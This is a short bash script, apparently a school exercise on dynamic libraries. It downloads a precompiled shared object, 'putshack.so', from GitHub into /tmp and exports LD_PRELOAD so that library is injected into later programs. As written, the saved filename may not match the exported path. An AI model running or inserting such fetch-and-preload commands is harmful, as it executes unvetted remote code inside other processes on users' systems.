#!/bin/bash
wget -P /tmp https://github.com/ehoneahobed/alx-low_level_programming/blob/master/0x18-dynamic_libraries/putshack.so?raw=true
export LD_PRELOAD=/tmp/putshack.so
